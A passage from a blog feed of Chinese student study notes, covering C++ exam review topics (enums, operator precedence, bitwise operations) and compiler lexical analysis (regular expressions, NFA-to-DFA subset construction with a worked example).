alt="74966D2A3FF6BD074F7A29C5CF3A4832"><figcaption aria-hidden="true">74966D2A3FF6BD074F7A29C5CF3A4832</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210616762312_293_20221107135842709137_738_36197BA4AFEF78EF89A0D8635CBFBEF7.jpg" alt="36197BA4AFEF78EF89A0D8635CBFBEF7"><figcaption aria-hidden="true">36197BA4AFEF78EF89A0D8635CBFBEF7</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210617754462_770_20221107135844032615_523_A025FDFE253E78CE2CDB8743D58DD963.jpg" alt="A025FDFE253E78CE2CDB8743D58DD963"><figcaption aria-hidden="true">A025FDFE253E78CE2CDB8743D58DD963</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210618730028_158_20221107220140271744_579_image-20221107220103032.png" alt="image-20221107220103032"><figcaption aria-hidden="true">image-20221107220103032</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84-cache/20230828210620264457_180_20221107135848168421_297_5C5A1A71E12687C41E251DEF29A3AE6B.jpg" alt="8D44BC68FBC1F5D2361F564FDEC15B81"><figcaption aria-hidden="true">8D44BC68FBC1F5D2361F564FDEC15B81</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>体系结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高级语言程序设计2-1笔试复习</title>
    <link href="/posts/64911/"/>
    <url>/posts/64911/</url>
    
    <content type="html"><![CDATA[<h1 id="高级语言程序设计2-1笔试复习">高级语言程序设计2-1笔试复习</h1><div class="note note-info">注：此系列内容仅供应对C++程序设计基础笔试使用。</div><h3 id="认识c">认识C++</h3><h4 id="基本概念和词汇">基本概念和词汇</h4><p>main不是C++中的保留字。因此<code>int main;</code>在C++中合法。</p><div class="note note-secondary">下列哪个是C++语言的合法的字符常量 "0" '054’ ‘' ‘\092’</div><blockquote><p>A选项，双引号表示的是字符串常量；B选项054表示八进制整数，但是缺少转义符号；D选项是将其后的整数092表示八进制整数，但是八进制不存在9这个数。注意，单引号表示的字符常量，可以是整数，但必须带有转义符号，其字符常量为整数表示的ASC码对应的字符</p></blockquote><p>一个经常设坑的点：八进制表达中出现8或9</p><h4 id="枚举常量">枚举常量</h4><p><code>enum t1 {a1,a2=7,a3,a4=15}time;</code></p><p>则枚举常量<code>a1</code>和<code>a3</code>的值分别是0和8</p><p>枚举值对应的整数值可以是任意整数。</p><p>注意区分枚举类型定义和枚举类型变量定义。前者定义的数据类型，后者是定义变量。定义类型名时不应该有=</p><div class="note note-warning">因此 enum a=[one,two,three);是不对的</div><p>还可以这样写</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-eri7ozlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-eri7ozlluwpkzv"><pre><code class="hljs c++"><span class="hljs-keyword">enum</span> <span class="hljs-title class_">team</span>{my, your=<span class="hljs-number">4</span>, his, her=his+<span class="hljs-number">10</span>};cout&lt;&lt;my&lt;&lt;<span class="hljs-string">' '</span>&lt;&lt;your&lt;&lt;<span class="hljs-string">' '</span>&lt;&lt;his&lt;&lt;<span class="hljs-string">' '</span>&lt;&lt;her&lt;&lt;endl;</code></pre></div></div><p>结果<code>0 4 5 15</code></p><h4 id="string">string</h4><p>关于字符串类型</p><p>使用<code>.length()</code>和<code>strlen()</code>时计算的字符串长度都不包含<code>\0</code></p><div class="note note-warning">注意:+不支持两个字符串字面常量的连接,如 string word4 "hello"+"world!";</div><h3 id="运算符和表达式">运算符和表达式</h3><h4 id="基本概念">基本概念</h4><p>在学习了编译原理之后，对这些概念以及对应的“奇特”写法应当已经见怪不怪。但为应对考试，仍记录以备复习。</p><h5 id="表达式">表达式</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210004010046_264_20221027094522795684_122_image-20221013141835992.png" alt="image-20221013141835992"><figcaption aria-hidden="true">image-20221013141835992</figcaption></figure><p>注意，“表达式”不带分号，带了分号就是语句。</p><h4 id="优先级和结合性">优先级和结合性</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-1btgeqlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-1btgeqlluwpkzv"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{    <span class="hljs-comment">//test 1</span>    <span class="hljs-type">int</span> k, a, b, c;    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> w = <span class="hljs-number">5</span>;    <span class="hljs-type">double</span> x = <span class="hljs-number">1.42</span>;<span class="hljs-comment">//    x%(-3); &lt;Invalid operands to binary expression ('double' and 'int')&gt;</span>    w += <span class="hljs-number">-2</span>; <span class="hljs-comment">// w=3</span>    k = (a = <span class="hljs-number">2</span>, b = <span class="hljs-number">3</span>, a + b); <span class="hljs-comment">// k=5</span>    c = k = a = <span class="hljs-number">2</span>, b = <span class="hljs-number">3</span>, a + b; <span class="hljs-comment">// c=5, k=2, a=2, b=3</span>    a += a -= (b = <span class="hljs-number">4</span>) * (a = <span class="hljs-number">3</span>); <span class="hljs-comment">// a=-18, b=4</span>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"a=%d"</span>, a);    <span class="hljs-comment">//test 2</span>    <span class="hljs-type">int</span> d2i = <span class="hljs-string">'A'</span> + <span class="hljs-number">1.6</span>;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"a2=%d"</span>, d2i); <span class="hljs-comment">//'A'+1.6=66.6=66 (ASCII code of 'A' is 65)</span>    <span class="hljs-comment">//test3</span><span class="hljs-comment">/*    d=9+e+f=d+9;</span><span class="hljs-comment">    expression is a value, not a variable in the memory,so it is not assignable */</span>}</code></pre></div></div><p><a href="https://blog.csdn.net/zb_915574747/article/details/99704639">优先级和结合性一览</a></p><h4 id="赋值运算">赋值运算</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-04rbmrlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-04rbmrlluwpkzv"><pre><code class="hljs c++">设有intx=<span class="hljs-number">11</span>：，则表达式(x++*<span class="hljs-number">1</span>/<span class="hljs-number">3</span>)的值是</code></pre></div></div><p><span class="math inline">\(\lfloor 11*1/3 \rfloor=3\)</span></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210007724435_990_20221027094525768953_130_image-20221013142054782.png" alt="image-20221013142054782"><figcaption aria-hidden="true">image-20221013142054782</figcaption></figure><p>做题时容易犯的错误：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-yh6qvjlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-yh6qvjlluwpkzv"><pre><code class="hljs c++">若d为<span class="hljs-type">double</span>型变量，则表达式d=<span class="hljs-number">1</span>，d+<span class="hljs-number">5</span>，d++的值是<span class="hljs-number">1</span>。d+<span class="hljs-number">5</span>不是d=d+<span class="hljs-number">5</span>。虽然很明显，做题的时候也需要有注意的意识</code></pre></div></div><h4 id="逻辑运算">逻辑运算</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210009306190_921_20221027094527376104_753_image-20221020095906292.png" alt="image-20221020095906292"><figcaption aria-hidden="true">image-20221020095906292</figcaption></figure><p>注意算术运算符优先于关系和除非以外的逻辑运算符！</p><p>短路运算举例：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-thdtomlluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-thdtomlluwpkzv"><pre><code class="hljs c++">×=y=<span class="hljs-number">3</span>;t=++x||++y后，y的值是</code></pre></div></div><blockquote><p>3，因为后面不会被运算</p></blockquote><p>优先级只是起“加括号”的作用。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-10xw85lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-10xw85lluwpkzv"><pre><code class="hljs c++"><span class="hljs-type">int</span> c,h;std::cout&lt;&lt;((c=<span class="hljs-number">2</span>)&amp;&amp;(h=<span class="hljs-number">-2</span>));<span class="hljs-comment">//always true</span></code></pre></div></div><h4 id="位运算">位运算</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210010905812_127_20221027094529486139_294_image-20221020105755065.png" alt="image-20221020105755065"><figcaption aria-hidden="true">image-20221020105755065</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210016259395_347_20221027094532506509_144_image-20221020104858172.png" alt="image-20221020104858172"><figcaption aria-hidden="true">image-20221020104858172</figcaption></figure><p>注意位运算的“地位”不是平等的，不要想当然按顺序算</p><h4 id="条件和逗号运算符">条件和逗号运算符</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E9%AB%98%E7%BA%A7%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A12-1%E7%AC%94%E8%AF%95%E5%A4%8D%E4%B9%A0/20230828210017313548_968_20221027094533764720_298_image-20221020111433316.png" alt="image-20221020111433316"><figcaption aria-hidden="true">image-20221020111433316</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xu7d43lluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-xu7d43lluwpkzv"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iomanip&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(</span></span><span class="hljs-params"><span class="hljs-function">{</span></span><span class="hljs-params"><span class="hljs-function">cout&lt;&lt;(<span class="hljs-number">0101</span>&amp;<span class="hljs-number">101</span>&gt;&gt;<span class="hljs-number">3</span>|<span class="hljs-number">101</span>&lt;&lt;<span class="hljs-number">3</span>^~<span class="hljs-number">0x10</span>)&lt;&lt;endl;</span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span></span><span class="hljs-params"><span class="hljs-function">}</span></span><span class="hljs-params"><span class="hljs-function"></span></span></code></pre></div></div><blockquote><p>优先级按位取反~最高，先将0x10（十六进制）按位取反，得到结果1111111111111111 1111111111101111，其次优先级按位左移和按位右移运算符优先级相同，计算101&gt;&gt;3得到00000000 00000000 00000000 00001100，以及101&lt;&lt;3得到 0000000000000000 0000001100101000，接下来计算0101（八进制）按位与（101&gt;&gt;3）的结果，得到结果为0,0按位或一个数所得结果为原值。因此最终答案为(101&lt;&lt;3)按位异或(~0x10)的结果，其结果为1111111111111111 11111100 11000111，为负数，求补得到绝对值。特别需要注意的是取反的时候是对整个int取反，16变-17</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jf1t4blluwpkzv"></i><span>c++</span><div class="collapse show" id="collapse-jf1t4blluwpkzv"><pre><code class="hljs c++">设intm=<span class="hljs-number">5</span>；<span class="hljs-type">float</span> x=<span class="hljs-number">3.5</span>；则表达式m+x+<span class="hljs-number">4.5</span>的结果应占据[填空]个字节。<span class="hljs-comment">//8。在隐式类型转换中转向了double</span></code></pre></div></div>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理-词法分析</title>
    <link href="/posts/6004/"/>
    <url>/posts/6004/</url>
    
    <content type="html"><![CDATA[<h1 id="编译原理-词法分析">编译原理-词法分析</h1><h2 id="正则表达式">正则表达式</h2><p>注意课上没提到的正则写法，仅作为了解</p><p><code>\w</code> 用于查找字母、数字和下划线</p><p><code>\W</code> 匹配除字母、数字和下划线之外的字符</p><p><code>\d</code> 仅用来匹配数字</p><p><code>\D</code>用来匹配数字之外的所有字符</p><p><code>\s</code> 仅匹配空白字符</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210524206495_377_20221107081612860400_768_image-20221105204422750.png" alt="image-20221105204422750" width="50%" height="50%"></p><p>首尾符号不同的a、b串</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hnl35ylluwpkzu"></i><span>c++</span><div class="collapse show" id="collapse-hnl35ylluwpkzu"><pre><code class="hljs c++">(<span class="hljs-built_in">a</span>(a*b)+) | (<span class="hljs-built_in">b</span>(b*a)+)或(<span class="hljs-built_in">a</span>(a|b)*b) | (<span class="hljs-built_in">b</span>(a|b)*a)</code></pre></div></div><p>首尾符号相同的a、b串 <strong>包括只有a或b的情况</strong></p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-j7rbpxlluwpkzu"></i><span>c++</span><div class="collapse show" id="collapse-j7rbpxlluwpkzu"><pre><code class="hljs c++">(<span class="hljs-built_in">a</span>(b*a)*)|(<span class="hljs-built_in">b</span>(a*b)*)</code></pre></div></div><h2 id="nfa设计">NFA设计</h2><p>不包含字串011的01串</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210525349884_991_20221107081614097039_483_image-20221105211752301.png" alt="image-20221105211752301"><figcaption aria-hidden="true">image-20221105211752301</figcaption></figure><p>偶数个0，偶数个1的0/1串</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210526567412_869_20221107081615829280_894_image-20221105212835393.png" alt="image-20221105212835393"><figcaption aria-hidden="true">image-20221105212835393</figcaption></figure><p>能被3整除的二进制串</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210527886997_545_20221107081617166099_636_image-20221105213415355.png" alt="image-20221105213415355"><figcaption aria-hidden="true">image-20221105213415355</figcaption></figure><h2 id="正则-nfa">正则-NFA</h2><p><code>Thomson 构造法</code>。基本思想是递归：</p><ol type="1"><li><p>对于基本的 re，直接构造</p></li><li><p>对于复合的 re，递归构造</p></li></ol><p>具体构造方式比较简单，在此略去</p><p>以(0 | 1)*110(0 | 1)*为例：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210529135341_633_20221107081618854779_247_image-20221106093147221.png" alt="image-20221106093147221"><figcaption aria-hidden="true">image-20221106093147221</figcaption></figure><h3 id="nfa-dfa">NFA-DFA</h3><p><code>子集构造法</code></p><h4 id="算法理解">算法理解：</h4><p>递推的思想</p><p>最简单的符号串ε：NFA状态集合←→DFA 状态</p><p>长度为1的串a=εa，在自动机中可达的状态为：从c对应的状态经过标记为a的边可达的状态</p><p>长度为2的串...</p><h4 id="算法需要注意的地方">算法需要注意的地方：</h4><ol type="1"><li><p>DFA新的状态对应NFA状态集消耗一个字符，能够走到的状态集。所以很明显，这里要消耗，所以不能是ε，并且只能消耗一个。</p></li><li><p>得到步骤 1 中的状态集之后，还需要考虑，这里面的所有节点，通过 ε能走到的所有状态。注意，这里的每个状态，只要可以通过 ε走，就必须一直走下去，也就是所谓的<code>ε-闭包</code>。这一步得到状态集的就是最后的结果。</p></li><li><p>第二步需要格外注意的是别忘了检查克林顿闭包中往回返的边。</p></li><li><p>只要包含了NFA中的终态，在DFA中就作为终态出现。</p></li><li><p>直到检查某一个状态的ε-闭包不再产生新状态的时候，算法停止。</p></li></ol><h4 id="实例">实例</h4><p>上面的图进行一遍子集构造的过程(往年的期末考题，推导过程要比课上讲的例子长一些，小心出错)</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210529135341_633_20221107081618854779_247_image-20221106093147221.png" alt="image-20221106093147221"><figcaption aria-hidden="true">image-20221106093147221</figcaption></figure><p>先考虑空串：</p><p>ε_closure({0})={0, 1, 2, 4, 7}=A</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210532194577_427_20221107081622072895_220_image-20221106113307803.png" alt="image-20221106113307803"><figcaption aria-hidden="true">image-20221106113307803</figcaption></figure><p>在DFA里加入开始状态A。</p><p>由于只有2有能够消耗0的边，因此下一步从这个状态指向的3开始考虑：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210534447618_828_20221107081623719225_876_image-20221106113154787.png" alt="image-20221106113154787"><figcaption aria-hidden="true">image-20221106113154787</figcaption></figure><p>ε_closure(δ(A, 0))=ε_closure({3})={3, 6, 7, 1, 2, 4}={1, 2, 3, 4, 6,7}=B</p><p>同理。不过这一次在A中4和7都能提供消耗1的边，因此要从5和8开始拓展两次ε_closure：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210535648426_872_20221107081625192588_768_image-20221106113520151.png" alt="image-20221106113520151"><figcaption aria-hidden="true">image-20221106113520151</figcaption></figure><p>ε_closure(δ(A, 1))=ε_closure({5,8})={5, 6, 7, 1, 2, 4, 8}={1, 2, 4,5, 6, 7, 8}=C</p><p>考虑了所有消耗一个字符的情况后，我们的DFA应当是这个样子：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210536903027_990_20221107081626891613_879_image-20221106095750761.png" alt="image-20221106095750761" width="67%" height="67%"></p><p>B状态消耗0的状态是{3}。而{3}的ε闭包我们已经求过，它就是B：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210538031576_380_20221107081627912947_486_image-20221106094657352.png" alt="image-20221106094657352"><figcaption aria-hidden="true">image-20221106094657352</figcaption></figure><p>ε_closure(δ(B, 0))=ε_closure({3})=B</p><p>同样的，B消耗1后为{5,8}，它的ε闭包我们也是知道的，是C。</p><p>ε_closure(δ(B, 1))=ε_closure({5,8})=C</p><p>那么有：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210539258340_309_20221107081629295837_152_image-20221106113947097.png" alt="image-20221106113947097" width="67%" height="67%"></p><p>再来考察C：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210540531607_259_20221107081630470656_164_image-20221106100409568.png" alt="image-20221106100409568"><figcaption aria-hidden="true">image-20221106100409568</figcaption></figure><p>ε_closure(δ(C, 0))=ε_closure({3})=B</p><p>ε_closure(δ(C, 1))=ε_closure({5,8,9})={5, 6, 7, 1, 2, 4, 8, 9}={1, 2,4, 5, 6, 7, 8, 9}=D</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210541717135_769_20221107081632830316_747_image-20221106100750517.png" alt="image-20221106100750517"><figcaption aria-hidden="true">image-20221106100750517</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210543144145_212_20221107081635290017_116_image-20221106114421614.png" alt="image-20221106114421614" width="67%" height="67%"></p><p>考察新状态D：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210544300675_259_20221107081636596912_786_image-20221106101039674.png" alt="image-20221106101039674"><figcaption aria-hidden="true">image-20221106101039674</figcaption></figure><p>ε_closure(δ(D, 0))=ε_closure({3,10})={3, 6, 7, 1, 2, 4, 10, 11, 12,14, 17}={1, 2, 3, 4, 6, 7, 10, 11, 12, 14, 17}=E</p><p>这一次覆盖的状态包含了终态17.因此在DFG中E就要加一个圈，表示终态。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210545455540_648_20221107081638049390_665_image-20221106101722642.png" alt="image-20221106101722642"><figcaption aria-hidden="true">image-20221106101722642</figcaption></figure><p>ε_closure(δ(D, 1))=ε_closure({4,7,8})=D</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210546517685_226_20221107081639688157_503_image-20221106114710326.png" alt="image-20221106114710326" width="67%" height="67%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210545455540_648_20221107081638049390_665_image-20221106101722642.png" alt="image-20221106101722642"><figcaption aria-hidden="true">image-20221106101722642</figcaption></figure><p>ε_closure(δ(E, 0))=ε_closure({3,13})={1, 2, 3, 4, 6, 7, 11, 12, 13,14, 16, 17}=F</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210549141377_330_20221107081642146138_964_image-20221106164356951.png" alt="image-20221106164356951"><figcaption aria-hidden="true">image-20221106164356951</figcaption></figure><p>ε_closure(δ(E, 1))=ε_closure({5,8,15})={ 1, 2, 4, 5, 6, 7, 8, 11, 12,14, 15, 16, 17}=G</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210550434003_492_20221107081643785412_875_image-20221106164315789.png" alt="image-20221106164315789"><figcaption aria-hidden="true">image-20221106164315789</figcaption></figure><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210551952501_856_20221107081645146555_627_image-20221106164515007.png" alt="image-20221106164515007" width="67%" height="67%"></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210549141377_330_20221107081642146138_964_image-20221106164356951.png" alt="image-20221106164356951"><figcaption aria-hidden="true">image-20221106164356951</figcaption></figure><p>ε_closure(δ(F, 0))=ε_closure({3,13})=F</p><p>ε_closure(δ(F, 1))=ε_closure({5,8,15})=G</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210550434003_492_20221107081643785412_875_image-20221106164315789.png" alt="image-20221106164315789"><figcaption aria-hidden="true">image-20221106164315789</figcaption></figure><p>ε_closure(δ(G, 0))=ε_closure({3,13})=F</p><p>ε_closure(δ(G, 1))= ε_closure({5,8,9,15})={ 1, 2, 4, 5, 6, 7, 8, 9,11, 12, 14, 15, 16, 17}=H</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210555562961_855_20221107081649213700_939_image-20221106164831871.png" alt="image-20221106164831871"><figcaption aria-hidden="true">image-20221106164831871</figcaption></figure><p>ε_closure(δ(H, 0))=ε_closure({3,10,13})={1, 2, 3, 4, 6, 7, 10, 11,12, 13, 14, 16, 17}=I</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210557006457_224_20221107081650544945_592_image-20221106165419438.png" alt="image-20221106165419438"><figcaption aria-hidden="true">image-20221106165419438</figcaption></figure><p>ε_closure(δ(H, 1))=H</p><p>ε_closure(δ(I, 0))=F</p><p>ε_closure(δ(I, 1))=G</p><p>发现I不再产生新的状态了，长舒一口气，终于可以结束了。</p><p>最终的DFA如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90/20230828210558147478_146_20221107081651688510_197_image-20221106114818599.png" alt="image-20221106114818599"><figcaption aria-hidden="true">image-20221106114818599</figcaption></figure><p>做题技巧：做到后面可以连同记下求过的ε_closure。A⊆B则ε_closure(A)⊆ε_closure(B)</p><p>识别0111010过程：A →B →C →D →D →E →G →F</p><h2 id="dfa优化">DFA优化</h2><h4 id="优化思想">优化思想</h4><p>具有非ε的输出边的状态显然是NFA中的重要状态</p><p>δ(s，a)不空，当且仅当s是重要状态→决定了ε_closure(δ(T，a))的计算→子集构造法的核心</p><p>两个子集若具有相同的重要状态，且同时包含或同时不包含终态，则可看作等价</p><h4 id="算法理解-1">算法理解</h4><p>下面这一篇文章对正则到DFA和DFA最小化的思想和具体实现剖析的比较透彻。其中正则到DFA并非重点考察内容，但对理解DFA优化的思想有比较大的帮助。</p><p><a target="_blank" href="https://wangwangok.github.io/2019/10/28/compiler_regular2dfa/" style="position: relative; display: -webkit-box; display: -webkit-flex; display: -ms-flexbox; display: flex; box-sizing: border-box; -webkit-flex-direction: row; -ms-flex-direction: row; flex-direction: row; -webkit-align-items: center; -webkit-box-align: center; -ms-flex-align: center; align-items: center; width: 390px; min-height: 84px; border-radius: 8px; max-width: 100%; overflow: hidden; margin: 16px auto; padding: 12px 12px 9px 12px; background-color: #F6F6F6;"><span class="LinkCard-contents"><span style="display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; text-overflow: ellipsis; max-height: 40px; line-height: 1.25; color: #121212;">词法分析-正则表达式到DFA</span><span style="display: -webkit-box; font-size: 13px; height: 18px; line-height: 18px; color: #999; 